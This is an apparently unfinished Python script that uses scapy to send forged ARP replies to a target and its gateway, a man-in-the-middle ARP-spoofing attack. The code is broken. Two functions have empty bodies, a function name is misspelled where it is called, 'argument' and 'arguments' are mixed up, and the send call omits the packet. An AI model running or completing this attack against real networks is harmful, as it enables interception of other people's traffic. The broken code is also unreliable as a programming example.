import scapy.all as scapy
import argparse

def get_mac():
    
def get_arguments():
    

def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send()
arguments=get_argumnets()
spoof(arguments.target, argument.gateway)
spoof(argument.gateway, arguments.target)
